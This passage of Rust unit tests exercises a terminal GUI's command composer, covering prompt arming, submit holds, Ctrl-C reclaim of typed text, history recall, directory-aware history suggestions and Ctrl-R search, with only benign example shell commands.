        st.mode = ComposerMode::Compose;
        // Armed chain: cover on the captured prompt-end row.
        assert_eq!(cover_line_for(&st, &b, true, now), Some(0));
        // Not comp_active and no hold ⇒ no cover.
        assert_eq!(cover_line_for(&st, &b, false, now), None);
        // Submit: Compose is kept (typeahead) and the hold pins the cover
        // even under comp_active=false (mode-independent, as before).
        st.draft = "echo hi".into();
        let cl = cover_line_for(&st, &b, true, now);
        let _ = st.submit(&b, cl, Some("C:\\"));
        assert_eq!(st.mode, ComposerMode::Compose);
        assert_eq!(
            cover_line_for(&st, &b, false, now),
            Some(0),
            "a live SubmitHold must keep the cover regardless of mode"
        );
        // Cap expiry ends the pinned cover too (fresh Instant: h.since is
        // stamped inside submit(), after `now`).
        let later = Instant::now() + SUBMIT_HOLD_MAX + Duration::from_millis(1);
        assert_eq!(cover_line_for(&st, &b, false, later), None);
    }

    /// Empty/whitespace Enter is the "more lines" spacing gesture: it sends a
    /// bare `\r` (honest shell newline), keeps Compose with the typeahead
    /// window open, and reports `spacer` so the app blanks the row — but
    /// never creates a ghost hold (the blank spacer, not a text ghost,
    /// bridges the re-prompt).
    #[test]
    fn empty_draft_submit_sends_cr_and_flags_spacer() {
        let b = backend_at_clean_prompt();
        let now = Instant::now();
        for draft in ["", "   ", "\n", " \r\n "] {
            let mut st = ComposerState::default();
            pump_counters(&mut st, &b, now);
            st.mode = ComposerMode::Compose;
            st.draft = draft.into();
            let (bytes, spacer) = st.submit(&b, Some(0), Some("C:\\"));
            assert_eq!(bytes, b"\r", "spacing gesture sends a bare CR ({draft:?})");
            assert!(spacer, "empty submit flags the spacer gesture ({draft:?})");
            assert_eq!(st.hold_line(&b, now), None, "no ghost hold for the gesture");
            assert_eq!(st.mode, ComposerMode::Compose);
            assert!(st.buffering());
        }
    }

    /// The flicker fix: a real submit's hold, once the echo is grid-verified
    /// on the row, is queued as a PERMANENT history cover (so the row keeps
    /// `❯ cmd` styling and never reverts to raw `PS …>`). Multi-line and
    /// unverifiable releases do NOT convert.
    #[test]
    fn released_hold_converts_to_history_cover() {
        let recs: Vec<BlockRec> = Vec::new();
        let now = Instant::now();

        // Single-line, echo lands on the row ⇒ conversion queued.
        let mut b = backend_at_clean_prompt(); // prompt_end (0, 8)
        let mut st = ComposerState::default();
        pump_counters(&mut st, &b, now);
        st.mode = ComposerMode::Compose;
        st.draft = "echo hi".into();
        let _ = st.submit(&b, cover_line_for(&st, &b, true, now), Some("C:\\"));
        b.advance_live(b"echo hi"); // shell echoes the command on the prompt row
        st.tick(&b, &recs, true, false, now);
        assert_eq!(st.hold_line(&b, now), None, "echo landed ⇒ released");
        assert_eq!(
            st.take_pending_history_cover(),
            Some((0, 8, Some("C:\\".to_string()), "echo hi".to_string())),
            "grid-verified single-line command converts to a history cover"
        );

        // Cap release with the echo NOT on the row ⇒ no conversion (honest
        // raw row rather than a wrong `❯ cmd`).
        let b = backend_at_clean_prompt();
        let mut st = ComposerState::default();
        pump_counters(&mut st, &b, now);
        st.mode = ComposerMode::Compose;
        st.draft = "never echoed".into();
        let _ = st.submit(&b, Some(0), Some("C:\\"));
        let later = Instant::now() + SUBMIT_HOLD_MAX + Duration::from_millis(1);
        st.tick(&b, &recs, true, false, later);
        assert_eq!(st.hold_line(&b, later), None);
        assert_eq!(
            st.take_pending_history_cover(),
            None,
            "an unverifiable cap release must not fabricate a history cover"
        );

        // Multi-line command ⇒ not converted (wrap-chain remap is out of
        // scope; releasing to raw is honest).
        let mut b = backend_at_clean_prompt();
        let mut st = ComposerState::default();
        pump_counters(&mut st, &b, now);
        st.mode = ComposerMode::Compose;
        st.draft = "line1\nline2".into();
        let _ = st.submit(&b, Some(0), Some("C:\\"));
        b.advance_live(b"line1"); // first line echoes
        st.tick(&b, &recs, true, false, now);
        assert_eq!(
            st.take_pending_history_cover(),
            None,
            "multi-line submissions are not converted to history covers"
        );
    }

    /// Cold-attach arm (task #15): a daemon-seeded prompt_end + on_attach_prompt
    /// auto-arms when the replayed cursor sits at the prompt end (clean), stays
    /// manual when it is past it (dirty), and is overruled by an open block
    /// (the restored-wrapper case).
    #[test]
    fn cold_attach_prompt_state_arms() {
        let recs: Vec<BlockRec> = Vec::new();
        let now = Instant::now();

        let seeded = |tail: &[u8], pe: usize| {
            let mut b = TermBackend::new(GridSize::default());
            b.set_stream_pos(0);
            b.enable_block_scan();
            b.advance(tail); // replay reconstruction (no live 133;B)
            b.seed_prompt_end(0, pe);
            b
        };

        // Clean: replayed cursor at the seeded prompt end ⇒ auto-arm.
        let b = seeded(b"PS C:\\> ", 8);
        let mut st = ComposerState::default();
        st.on_attach_prompt(now);
        assert!(st.at_prompt_latched());
        st.tick(&b, &recs, true, true, now);
        assert_eq!(st.mode, ComposerMode::Compose, "clean cold-attach auto-arms");

        // Dirty: replayed cursor past the prompt end (typed input) ⇒ manual.
        let b = seeded(b"PS C:\\> ls", 8);
        let mut st = ComposerState::default();
        st.on_attach_prompt(now);
        st.tick(&b, &recs, true, true, now);
        assert_eq!(
            st.mode,
            ComposerMode::Raw(RawReason::NoPrompt),
            "a dirty cold-attach stays manual-arm"
        );

        // Open block (restored claude wrapper): the daemon certifies
        // at_prompt=false whenever a block is open, so NO latch arrives on
        // attach — and without the latch the busy gate blocks arming. (A
        // LIVE latch would feed-time-close the rec per F7: a scanned pre IS
        // the daemon's own close signal.)
        let b = seeded(b"PS C:\\> ", 8);
        let mut st = ComposerState::default();
        let open = vec![BlockRec {
            end_off: None,
            ..rec("claude")
        }];
        st.tick(&b, &open, true, true, now);
        assert_ne!(st.mode, ComposerMode::Compose, "an open block blocks arming");
    }

    /// The visible-^C reclaim is DEAD for normal typing (typeahead fix #3):
    /// a raw key at a latched prompt leaves the composer ManualOnly with NO
    /// automatic chord and NO auto-arm — post-submit typing buffers in the
    /// editor now, so raw text at a prompt is genuinely user-typed and its
    /// reclaim stays strictly click-gated (`activate`, outcome announced on
    /// the strip). No `PS …> f^C` churn ever appears in scrollback from
    /// fast typing.
    #[test]
    fn raw_key_at_prompt_stays_manual_no_auto_chord() {
        let recs: Vec<BlockRec> = Vec::new();
        let now = Instant::now();

        // prompt_end captured (0,8) with a raw key ("l") echoed past it.
        let mut b = backend_at_clean_prompt();
        b.advance_live(b"l");
        assert!(!b.cursor_at_prompt_end(), "cursor is now dirty (echo)");

        let mut st = ComposerState::default();
        pump_counters(&mut st, &b, now);
        assert_eq!(st.mode, ComposerMode::Raw(RawReason::NoPrompt));
        st.on_raw_input(now); // the key went raw; user chose the grid
        assert!(st.episode_used);
        // Arm frame and well beyond: ManualOnly — no chord, no arm, ever.
        for dt in [0u64, 100, 500, 1000] {
            st.tick(&b, &recs, true, true, now + Duration::from_millis(dt));
            assert_eq!(
                st.mode,
                ComposerMode::Raw(RawReason::NoPrompt),
                "raw typing at a prompt is honoured — never auto-reclaimed (+{dt}ms)"
            );
            assert!(
                st.take_pending_clear().is_none(),
                "NO automatic clear chord may ever fire (+{dt}ms)"
            );
        }
        assert!(st.episode_used, "the episode stays spent");

        // The click-gated path still recovers the text + ships the chord —
        // the ONE sanctioned reclaim (user-initiated, outcome pre-announced).
        let bytes = st.activate(&b);
        assert_eq!(bytes, vec![0x03], "chord ships only on the explicit click");
        assert_eq!(st.draft, "l", "the typed text is reclaimed into the draft");
        assert_eq!(st.mode, ComposerMode::Compose);

        // Deliberate yield (UserRaw) then a raw key: stays raw.
        let mut st = ComposerState::default();
        pump_counters(&mut st, &b, now);
        st.mode = ComposerMode::Compose;
        st.blur_to_grid(); // explicit ⌨/Esc yield ⇒ UserRaw + episode used
        assert_eq!(st.mode, ComposerMode::Raw(RawReason::UserRaw));
        st.on_raw_input(now);
        st.tick(&b, &recs, true, true, now);
        assert_eq!(
            st.mode,
            ComposerMode::Raw(RawReason::UserRaw),
            "a deliberate yield is never reclaimed"
        );
        assert!(st.take_pending_clear().is_none());
    }

    /// R1 regression: cold-attach announces the UN-shrunk grid (the terminal
    /// isn't known-hooked yet), then the next frame's corrective strip-resize
    /// shrinks it. The cold-attach seed (prompt_end) must SURVIVE that resize —
    /// otherwise cursor_at_prompt_end goes false and the armed composer drops
    /// to the strip with the bare `PS …>` prompt still showing (the two-prompt
    /// boot look). cover_line_for must stay Some across the resize.
    #[test]
    fn cold_attach_cover_survives_corrective_strip_resize() {
        let recs: Vec<BlockRec> = Vec::new();
        let now = Instant::now();
        let mut b = TermBackend::new(GridSize {
            cols: 80,
            rows: 24,
            cell_width: 8.0,
            cell_height: 16.0,
        });
        b.set_stream_pos(0);
        b.enable_block_scan();
        b.advance(b"line1\r\nline2\r\nPS C:\\> "); // restored screen; cursor (2, 8)
        b.seed_prompt_end(2, 8);
        let mut st = ComposerState::default();
        st.on_attach_prompt(now);
        st.tick(&b, &recs, true, true, now);
        assert_eq!(st.mode, ComposerMode::Compose, "cold attach arms");
        assert_eq!(
            cover_line_for(&st, &b, true, now),
            Some(2),
            "cover on before the corrective resize"
        );
        // The one corrective strip-resize (shrink ~2 rows for STRIP_H).
        b.resize_to(egui::vec2(80.0 * 8.0, 22.0 * 16.0), egui::vec2(8.0, 16.0));
        assert!(
            cover_line_for(&st, &b, true, now).is_some(),
            "R1: the corrective strip-resize wiped the cold-attach seed → cover dropped to the strip"
        );
    }

    /// Bug 4: yield-to-raw is exclusively Esc / the ⌨ toggle (blur_to_grid)
    /// or actual raw PTY bytes (on_raw_input) — both consume the episode.
    /// Pointer interaction (clicks, drag-select, wheel) has NO ComposerState
    /// hook at all: frames pass, the arm + draft + prompt latch stay exactly
    /// as they were, and only the next `pre` re-opens a blurred episode.
    #[test]
    fn pointer_never_disarms_blur_consumes_episode() {
        let b = backend_at_clean_prompt();
        let now = Instant::now();
        let recs: Vec<BlockRec> = Vec::new();
        let mut st = ComposerState::default();
        let f = b.block_feed.as_ref().unwrap();
        let (pre0, exec0) = (f.pre_seen, f.exec_seen);
        st.on_stream_events(pre0, exec0, now);
        st.tick(&b, &recs, true, true, now);
        assert_eq!(st.mode, ComposerMode::Compose);
        st.draft = "half-written".into();
        // Frames pass while the user selects scrollback / scrolls (the cover
        // may drop presentationally, but no state hook fires): armed, draft
        // and latch untouched.
        for _ in 0..3 {
            st.tick(&b, &recs, true, false, now);
        }
        assert_eq!(st.mode, ComposerMode::Compose);
        assert_eq!(st.draft, "half-written");
        assert!(st.at_prompt_latched());
        // Esc / ⌨ consume the episode: no auto-re-arm fight for the rest of
        // this prompt episode…
        st.blur_to_grid();
        assert_eq!(st.mode, ComposerMode::Raw(RawReason::UserRaw));
        st.tick(&b, &recs, true, true, now);
        assert_eq!(st.mode, ComposerMode::Raw(RawReason::UserRaw));
        assert_eq!(st.draft, "half-written", "draft survives the blur");
        // …until the next pre re-opens it and the gate re-arms.
        st.on_stream_events(pre0 + 1, exec0, now);
        st.tick(&b, &recs, true, true, now);
        assert_eq!(st.mode, ComposerMode::Compose);
    }

    fn rec(cmd: &str) -> BlockRec {
        BlockRec {
            epoch: 1,
            n: 0,
            cmd: cmd.into(),
            cwd: None,
            exit: Some(0),
            started_ms: 0,
            ended_ms: Some(1),
            start_off: 0,
            end_off: Some(1),
            truncated: false,
        }
    }

    // ── Typeahead reclaim at activation (P4 §2.4) ────────────────────

    /// A dirty prompt's exactly-recoverable text is pulled into an empty
    /// draft; the clear chord still ships; the mode arms.
    #[test]
    fn activate_reclaims_into_empty_draft() {
        let mut b = backend_at_clean_prompt();
        b.advance_live(b"dir /w"); // stray typed text echoed at the prompt
        assert!(!b.cursor_at_prompt_end());
        let mut st = ComposerState::default();
        let now = Instant::now();
        pump_counters(&mut st, &b, now);
        let bytes = st.activate(&b);
        assert_eq!(bytes, vec![0x03], "clear chord ships on a dirty activate");
        assert_eq!(st.draft, "dir /w", "typed text reclaimed into the draft");
        assert_eq!(st.mode, ComposerMode::Compose);
        assert!(st.caret_to_end, "caret goes to the end of the reclaim");
        assert!(st.want_focus);
    }

    /// Reclaim never destroys an existing draft: the fragment appends on its
    /// own line (D5 / open question 4) and any recall walk resets.
    #[test]
    fn activate_appends_below_existing_draft() {
        let mut b = backend_at_clean_prompt();
        b.advance_live(b"typed");
        let mut st = ComposerState {
            draft: "held".into(),
            ..Default::default()
        };
        st.recall = Some((RecallSrc::Recs(0), "old".into()));
        let now = Instant::now();
        pump_counters(&mut st, &b, now);
        let bytes = st.activate(&b);
        assert_eq!(bytes, vec![0x03]);
        assert_eq!(st.draft, "held\ntyped", "reclaim appends, never replaces");
        assert!(st.caret_to_end);
        assert!(st.recall.is_none(), "reclaim is an edit: recall walk resets");
    }

    /// Refusal variants (multi-line here) fall back to v1's discard: draft
    /// untouched, chord returned, mode armed.
    #[test]
    fn activate_falls_back_to_discard() {
        let mut b = backend_at_clean_prompt();
        b.advance_live(b"echo 'abc\r\n>> more"); // continuation prompt shape
        assert_eq!(b.reclaim_text(), crate::gui::term_backend::Reclaim::MultiLine);
        let mut st = ComposerState {
            draft: "held".into(),
            ..Default::default()
        };
        let bytes = st.activate(&b);
        assert_eq!(bytes, vec![0x03], "v1 discard: chord still ships");
        assert_eq!(st.draft, "held", "no guessed text ever enters the draft");
        assert_eq!(st.mode, ComposerMode::Compose);
        // A clean prompt activate stays byte-free (v1 unchanged).
        let b = backend_at_clean_prompt();
        let mut st = ComposerState::default();
        assert!(st.activate(&b).is_empty());
    }

    /// History insert stashes the displaced draft in the recall slot;
    /// ArrowDown restores it; an edit (model-level: submit) drops the stash;
    /// inserting over an empty draft stashes nothing.
    #[test]
    fn insert_history_stashes_and_restores() {
        let recs: Vec<BlockRec> = ["a", "b"].iter().map(|c| rec(c)).collect();
        let mut st = ComposerState {
            draft: "half-typed".into(),
            ..Default::default()
        };
        st.insert_history("git push");
        assert_eq!(st.draft, "git push");
        assert!(st.caret_to_end);
        assert!(st.want_focus);
        assert_eq!(
            st.recall,
            Some((RecallSrc::History, "half-typed".to_string()))
        );
        // ArrowDown past-newest restores the stash directly.
        st.recall_next(&recs);
        assert_eq!(st.draft, "half-typed");
        assert!(st.recall.is_none());
        // ArrowUp from a History stash walks from the newest rec, stash kept.
        let mut st = ComposerState {
            draft: "half-typed".into(),
            ..Default::default()
        };
        st.insert_history("git push");
        st.recall_prev(&recs);
        assert_eq!(st.draft, "b", "History recall walk starts at the newest rec");
        st.recall_next(&recs);
        assert_eq!(
            st.draft, "half-typed",
            "past-newest restores the SAVED string for both sources (spec §7.2)"
        );
        assert!(st.recall.is_none());
        // Empty draft: nothing to stash.
        let mut st = ComposerState::default();
        st.insert_history("ls");
        assert_eq!(st.draft, "ls");
        assert!(st.recall.is_none());
        // A submit clears the stash (edit-equivalent, P3 rule).
        let mut st = ComposerState {
            draft: "x".into(),
            ..Default::default()
        };
        st.insert_history("y");
        st.draft = "y".into();
        let backend = TermBackend::new(GridSize::default());
        let _ = st.submit(&backend, None, None);
        assert!(st.recall.is_none());
    }

    /// D10: the history popup's Run action is enabled iff the composer is
    /// armed at a submit-ready prompt (Compose) or provably armable this
    /// frame (gate AutoArm) — never from ManualOnly (stray text would prefix
    /// the command) and never while a block is open.
    #[test]
    fn run_enable_rule() {
        let now = Instant::now();
        let recs: Vec<BlockRec> = Vec::new();
        let b = backend_at_clean_prompt();

        // AutoArm (clean latched prompt, Raw mode) ⇒ allowed.
        let mut st = ComposerState::default();
        pump_counters(&mut st, &b, now);
        assert!(st.history_run_allowed(&b, &recs, true, now));

        // Armed Compose at the prompt ⇒ allowed.
        st.mode = ComposerMode::Compose;
        assert!(st.history_run_allowed(&b, &recs, true, now));

        // Open block with the latch cleared (a really-running command: the
        // exec edge clears at_prompt) ⇒ refused in both modes.
        let open = vec![BlockRec {
            end_off: None,
            ..rec("sleep")
        }];
        let mut busy = ComposerState::default();
        busy.on_stream_events(1, 0, now); // prompt…
        busy.on_stream_events(1, 1, now); // …then exec: latch cleared
        assert!(!busy.history_run_allowed(&b, &open, true, now));
        busy.mode = ComposerMode::Compose;
        assert!(!busy.history_run_allowed(&b, &open, true, now));
        // F7: a LIVE prompt latch feed-time-closes a stale open rec (the
        // scanned pre is the daemon's own close signal; the Blocks close
        // frame is a round-trip behind) — Run does not wait on it.
        assert!(
            st.history_run_allowed(&b, &open, true, now),
            "a live latch overrides a stale open rec (F7)"
        );

        // ManualOnly (dirty cursor) ⇒ refused.
        let mut dirty = backend_at_clean_prompt();
        dirty.advance_live(b"stray");
        let mut st = ComposerState::default();
        pump_counters(&mut st, &dirty, now);
        assert!(!st.history_run_allowed(&dirty, &recs, true, now));

        // Dead ⇒ refused.
        let mut st = ComposerState::default();
        pump_counters(&mut st, &b, now);
        assert!(!st.history_run_allowed(&b, &recs, false, now));
    }

    /// §11 recall: recs [a, b, b, "", c] → Up: c, b, a (dupes and blanks
    /// skipped); Down walks back and past-newest restores the saved draft;
    /// an edit mid-recall drops the recall state.
    #[test]
    fn recall_walks_and_dedupes() {
        let recs: Vec<BlockRec> = ["a", "b", "b", "", "c"].iter().map(|c| rec(c)).collect();
        let mut st = ComposerState {
            draft: "draft0".into(),
            ..Default::default()
        };
        st.recall_prev(&recs);
        assert_eq!(st.draft, "c");
        st.recall_prev(&recs);
        assert_eq!(st.draft, "b");
        st.recall_prev(&recs);
        assert_eq!(st.draft, "a");
        st.recall_prev(&recs); // at the oldest: stays
        assert_eq!(st.draft, "a");
        st.recall_next(&recs);
        assert_eq!(st.draft, "b");
        st.recall_next(&recs);
        assert_eq!(st.draft, "c");
        st.recall_next(&recs); // past the newest: saved draft restored
        assert_eq!(st.draft, "draft0");
        assert!(st.recall.is_none());
        // Edit-drops-recall is enforced at the UI (response.changed());
        // model side: a submit clears it too.
        let backend = TermBackend::new(GridSize::default());
        st.recall_prev(&recs);
        assert!(st.recall.is_some());
        st.draft = "x".into();
        let _ = st.submit(&backend, None, None);
        assert!(st.recall.is_none());
    }

    /// Tier-2a #2 history ghost — selection: strict case-sensitive prefix,
    /// most-recent wins, blanks/multiline/exact-match skipped, empty draft
    /// never suggests.
    #[test]
    fn history_ghost_selection() {
        // Location-independent commands: cwd plays no part (both None here).
        let g = |recs: &[BlockRec], d: &str| {
            history_ghost(recs, d, &complete::Family::Pwsh, None)
        };
        let recs: Vec<BlockRec> = ["git status", "cargo build", "", "git stash pop", "ls"]
            .iter()
            .map(|c| rec(c))
            .collect();
        // Most-recent prefix match wins: "git " hits "git stash pop", not
        // the older "git status".
        assert_eq!(g(&recs, "git "), Some("stash pop".into()));
        assert_eq!(g(&recs, "git sta"), Some("sh pop".into()));
        // The newer match gone from the prefix set, the older one serves.
        assert_eq!(g(&recs, "git stat"), Some("us".into()));
        assert_eq!(g(&recs, "car"), Some("go build".into()));
        // Case-sensitive: "GIT" matches nothing.
        assert_eq!(g(&recs, "GIT"), None);
        // Empty draft = no ghost; no-match = no ghost.
        assert_eq!(g(&recs, ""), None);
        assert_eq!(g(&recs, "docker"), None);
        // Exact match yields no remainder and falls through to an OLDER,
        // longer command with the same prefix.
        let recs2: Vec<BlockRec> = ["ls -la", "ls"].iter().map(|c| rec(c)).collect();
        assert_eq!(g(&recs2, "ls"), Some(" -la".into()));
        // Multiline drafts and multiline history commands never ghost
        // (the ghost paints inline in the single-line lane).
        assert_eq!(g(&recs, "git\nls"), None);
        let recs3: Vec<BlockRec> = ["echo a\necho b"].iter().map(|c| rec(c)).collect();
        assert_eq!(g(&recs3, "echo"), None);
        // Blank commands are skipped even for a whitespace draft.
        let recs4: Vec<BlockRec> = ["   "].iter().map(|c| rec(c)).collect();
        assert_eq!(g(&recs4, " "), None);
    }

    /// Tier-2a #2 history ghost — accept appends the remainder, puts the
    /// caret at the end, and the suggestion clears naturally (the completed
    /// draft now matches exactly ⇒ no remainder).
    #[test]
    fn history_ghost_accept_appends_and_clears() {
        let recs: Vec<BlockRec> = ["git status"].iter().map(|c| rec(c)).collect();
        let mut st = ComposerState {
            draft: "git st".into(),
            ..Default::default()
        };
        let fam = complete::Family::Pwsh;
        let rest =
            history_ghost(&recs, &st.draft, &fam, None).expect("ghost offered");
        assert_eq!(rest, "atus");
        let caret = st.ghost_accept(&rest);
        assert_eq!(st.draft, "git status");
        assert_eq!(caret, "git status".chars().count());
        // Derived state: with the full command in the draft, the ghost is
        // simply gone — nothing to clear, nothing stored.
        assert_eq!(history_ghost(&recs, &st.draft, &fam, None), None);
        // And typing PAST the suggestion (mismatch) clears it the same way.
        st.draft.push('x');
        assert_eq!(history_ghost(&recs, &st.draft, &fam, None), None);
        // The accepted text is draft-only: submission machinery sees it as
        // any typed draft (nothing queued, no bytes emitted by accept).
        assert!(st.pending.is_empty());
    }

    fn rec_at(cmd: &str, cwd: Option<&str>) -> BlockRec {
        BlockRec {
            cwd: cwd.map(std::path::PathBuf::from),
            ..rec(cmd)
        }
    }

    /// Ghost cwd fix (sandbox field failure: `cd Users\` ghosted in
    /// C:\Users from a C:\ session → `C:\Users\Users` error): the
    /// eligibility matrix. Path-sensitive commands ghost only from the SAME
    /// cwd; location-independent commands ghost across cwds; unknown cwd on
    /// either side is conservative (no ghost when path-sensitive).
    #[test]
    fn history_ghost_cwd_eligibility_matrix() {
        let fam = complete::Family::Pwsh;
        let g = |recs: &[BlockRec], d: &str, cwd: Option<&str>| {
            history_ghost(recs, d, &fam, cwd)
        };
        // Same-cwd cd → ghost OK (trailing separator + case differences in
        // the tracked string must not break the match).
        let cd = vec![rec_at("cd Users\\proj", Some("C:\\"))];
        assert_eq!(g(&cd, "cd U", Some("C:\\")), Some("sers\\proj".into()));
        assert_eq!(g(&cd, "cd U", Some("c:")), Some("sers\\proj".into()));
        // Different-cwd cd → INELIGIBLE (the exact field failure).
        assert_eq!(g(&cd, "cd U", Some("C:\\Users")), None);
        // Unknown on either side + path-sensitive → conservative, no ghost.
        assert_eq!(g(&cd, "cd U", None), None);
        let cd_unknown = vec![rec_at("cd Users\\proj", None)];
        assert_eq!(g(&cd_unknown, "cd U", Some("C:\\")), None);
        // Different-cwd git status → still ghosts (the useful case).
        let git = vec![rec_at("git status", Some("C:\\repo"))];
        assert_eq!(g(&git, "git s", Some("D:\\other")), Some("tatus".into()));
        assert_eq!(g(&git, "git s", None), Some("tatus".into()));
        // Different-cwd RELATIVE path argument → ineligible.
        let rel = vec![rec_at("type foo\\bar.txt", Some("C:\\a"))];
        assert_eq!(g(&rel, "type f", Some("C:\\b")), None);
        assert_eq!(g(&rel, "type f", Some("C:\\a")), Some("oo\\bar.txt".into()));
        // ABSOLUTE path argument → cwd-independent, ghosts anywhere.
        let abs = vec![rec_at("type C:\\foo\\bar.txt", Some("C:\\a"))];
        assert_eq!(
            g(&abs, "type C", Some("D:\\b")),
            Some(":\\foo\\bar.txt".into())
        );
        // Ineligible newest falls through to an older ELIGIBLE match.
        let recs = vec![
            rec_at("git checkout main", Some("C:\\repo")),
            rec_at("git checkout feature\\x", Some("C:\\elsewhere")),
        ];
        assert_eq!(
            g(&recs, "git c", Some("C:\\repo")),
            Some("heckout main".into()),
            "ineligible entry must fall through, not kill the ghost"
        );
        // Posix families: absolute stays eligible cross-cwd, relative not.
        let wsl = complete::Family::Wsl { distro: None };
        let recs = vec![rec_at("cat /etc/hosts", Some("/home/u"))];
        assert_eq!(
            history_ghost(&recs, "cat /e", &wsl, Some("/tmp")),
            Some("tc/hosts".into())
        );
        let recs = vec![rec_at("cat sub/file", Some("/home/u"))];
        assert_eq!(history_ghost(&recs, "cat s", &wsl, Some("/tmp")), None);
    }

    /// The path-sensitivity classifier itself: cd-family verbs (with an
    /// argument, across separators, case-folded), relative vs anchored
    /// tokens, flags and URLs exempt.
    #[test]
    fn path_sensitive_classifier() {
        let fam = complete::Family::Pwsh;
        let ps = |s: &str| path_sensitive(&fam, s);
        // cd-family heads with any argument; bare cd is not.
        assert!(ps("cd sub"));
        assert!(ps("Set-Location 'my dir'"));
        assert!(ps("pushd .."));
        assert!(ps("sl x"));
        assert!(ps("chdir C:\\abs")); // cd is stateful even to an absolute
        assert!(!ps("cd"));
        // A cd behind a separator is still caught (classify's head rule).
        assert!(ps("git pull && cd sub"));
        assert!(!ps("git pull && cd"));
        // Relative path tokens anywhere → sensitive.
        assert!(ps("type foo\\bar.txt"));
        assert!(ps("cat sub/dir/file"));
        assert!(ps(".\\build.ps1 -Fast")); // relative HEAD
        assert!(ps("type C:foo\\bar")); // drive-RELATIVE
        // Anchored forms → not sensitive.
        assert!(!ps("type C:\\foo\\bar.txt"));
        assert!(!ps("type c:/foo/bar"));
        assert!(!ps("dir \\\\srv\\share\\x"));
        assert!(!ps("cat ~/notes.txt"));
        assert!(!ps("git clone https://github.com/a/b"));
        // Flags with separators are exempt (the non-flag rule).
        assert!(!ps("git log --pretty=format:a/b"));
        // Location-independent commands.
        assert!(!ps("git status"));
        assert!(!ps("cargo build --release"));
        // Posix family: `/…` is absolute there, but not on pwsh (a pwsh
        // `/foo` is drive-root-relative — stays conservative).
        let wsl = complete::Family::Wsl { distro: None };
        assert!(!path_sensitive(&wsl, "cat /etc/hosts"));
        assert!(ps("cat /etc/hosts"));
        assert!(path_sensitive(&wsl, "cat etc/hosts"));
    }

    /// The interplay the user suspected in the sandbox: with a ghost
    /// visible and Tab yielding ZERO completion candidates, the ghost must
    /// neither be accepted nor become the draft (Tab is inert; ArrowRight
    /// remains the only accept gesture). Driven through show() against a
    /// real empty directory so complete.rs genuinely enumerates nothing.
    #[test]
    fn show_tab_without_candidates_never_accepts_ghost() {
        let dir = tab_scratch(&[]); // an EMPTY dir: no "U*" entries exist
        let cwd = dir.to_str().unwrap().to_owned();
        let b = backend_at_clean_prompt();
        let mut st = ComposerState::default();
        let now = Instant::now();
        let f = b.block_feed.as_ref().unwrap();
        st.on_stream_events(f.pre_seen, f.exec_seen, now);
        // Same-cwd history entry, so the ghost IS eligible and visible.
        let recs = vec![rec_at("cd Users\\proj", Some(&cwd))];
        st.tick(&b, &recs, true, true, now);
        assert_eq!(st.mode, ComposerMode::Compose);

        let ctx = egui::Context::default();
        let strip = Rect::from_min_max(Pos2::new(0.0, 564.0), Pos2::new(800.0, 600.0));
        let grid = Rect::from_min_max(Pos2::ZERO, Pos2::new(800.0, 564.0));
        let frame = |st: &mut ComposerState, events: Vec<egui::Event>| {
            let raw = egui::RawInput {
                screen_rect: Some(Rect::from_min_max(
                    Pos2::ZERO,
                    Pos2::new(800.0, 600.0),
                )),
                events,
                ..Default::default()
            };
            let mut out = None;
            let _ = ctx.run_ui(raw, |ctx| {
                egui::CentralPanel::default().show(ctx, |ui| {
                    out = Some(show(
                        ui,
                        strip,
                        grid,
                        Uuid::nil(),
                        st,
                        &b,
                        &recs,
                        1,
                        true,
                        false,
                        false,
                        FontId::monospace(13.0),
                        None,
                        Some(&cwd), // the SAME cwd Tab and the ghost share
                    ));
                });
            });
            let o = out.unwrap();
            st.has_focus = o.has_focus;
            o
        };
        let key = |k: Key| egui::Event::Key {
            key: k,
            physical_key: None,
            pressed: true,
            repeat: false,
            modifiers: Modifiers::NONE,
        };
        frame(&mut st, vec![]);
        frame(&mut st, vec![egui::Event::Text("cd U".into())]);
        assert_eq!(st.draft, "cd U");
        // The ghost is genuinely on offer this frame.
        assert_eq!(
            history_ghost(&recs, &st.draft, &st.fam, Some(&cwd)).as_deref(),
            Some("sers\\proj")
        );
        // Tab with zero candidates: draft untouched — no literal tab, no
        // completion, and ABOVE ALL no ghost acceptance.
        frame(&mut st, vec![key(Key::Tab)]);
        assert_eq!(st.draft, "cd U", "Tab must not accept the ghost");
        assert!(!st.tab_active(), "no cycle exists without candidates");
        // ArrowRight (caret at end) remains the accept gesture.
        frame(&mut st, vec![key(Key::ArrowRight)]);
        assert_eq!(st.draft, "cd Users\\proj", "ArrowRight accepts");
        let _ = std::fs::remove_dir_all(&dir);
    }

    // ── Ctrl-R history search (Tier-2b #1) ───────────────────────────────

    /// The overlay state machine: open stashes the draft (the lane becomes
    /// the query), accept sets the draft and NEVER submits, and the
    /// displaced pre-search draft rides the recall stash (ArrowDown
    /// restores it — the one stash contract shared with insert_history).
    #[test]
    fn search_accept_sets_draft_and_never_submits() {
        let mut st = ComposerState {
            mode: ComposerMode::Compose,
            draft: "half typed".into(),
            ..Default::default()
        };
        st.search_begin();
        assert!(st.search_active());
        assert_eq!(st.draft, "", "query starts empty — the draft is stashed");
        st.draft = "gco".into(); // typing = query edits while open
        st.search_edited();
        st.search_accept("git checkout main");
        assert!(!st.search_active());
        assert_eq!(st.draft, "git checkout main");
        // NOT a submission: no ledger command, no bytes, no queue, no
        // typeahead window — the draft is simply ready to edit/run.
        assert!(st.take_submit_cmd().is_none());
        assert!(st.take_pending_clear().is_none());
        assert!(st.pending.is_empty());
        assert!(!st.buffering());
        assert_eq!(st.mode, ComposerMode::Compose);
        assert!(st.want_focus, "focus returns to the editor on close");
        // Stash contract: ArrowDown restores the displaced draft.
        st.recall_next(&[]);
        assert_eq!(st.draft, "half typed");
        // Re-opening while already open is a no-op (the stash is kept).
        st.search_begin();
        st.search_begin();
        assert_eq!(st.search.as_ref().unwrap().saved, "half typed");
    }

    /// Esc (and every close-without-accept path) restores the pre-search
    /// draft EXACTLY, regardless of what was typed into the query.
    #[test]
    fn search_cancel_restores_pre_search_draft_exactly() {
        let mut st = ComposerState {
            mode: ComposerMode::Compose,
            draft: "cargo build --release".into(),
            ..Default::default()
        };
        st.search_begin();
        st.draft = "zzz no match".into();
        st.search_cancel();
        assert!(!st.search_active());
        assert_eq!(st.draft, "cargo build --release");
        assert!(st.want_focus);
        // A pre-existing recall stash survives the whole round trip (query
        // edits are NOT draft edits).
        let mut st = ComposerState {
            mode: ComposerMode::Compose,
            draft: "recalled".into(),
            recall: Some((RecallSrc::History, "original".into())),
            ..Default::default()
        };
        st.search_begin();
        st.draft = "query".into();
        st.search_cancel();
